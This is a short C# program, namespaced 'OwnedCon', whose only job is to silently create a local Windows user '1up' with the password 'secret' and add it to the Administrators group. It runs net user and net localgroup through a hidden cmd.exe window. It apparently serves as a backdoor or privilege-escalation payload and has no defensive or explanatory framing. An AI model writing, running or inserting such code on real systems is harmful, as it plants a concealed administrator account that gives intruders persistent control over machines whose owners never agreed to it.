using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace OwnedCon
{
    class Program
    {
        static void Main(string[] args)
        {
            // add new user account 1up with password secret
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "cmd.exe"; // set command
            psi.Arguments = "/C net user /add 1up secret"; // set arguments
            psi.UseShellExecute = false;
            psi.CreateNoWindow = true; //don't create window
            psi.WindowStyle = ProcessWindowStyle.Hidden; //set window to hidden
            var proc = new Process(); // create Process() instance
            proc.StartInfo = psi; // pass ProcessStartInfo instance
            proc.Start(); // launch command
            proc.WaitForExit(); // wait for command to complete

            // set new user account as administrator
            psi.FileName = "cmd.exe"; // set command
            psi.Arguments = "/C net localgroup administrators 1up /add"; // set arguments
            proc.StartInfo = psi; // pass ProcessStartInfo instance
            proc.Start(); // launch command
            proc.WaitForExit(); // wait for command to complete
        }
    }
}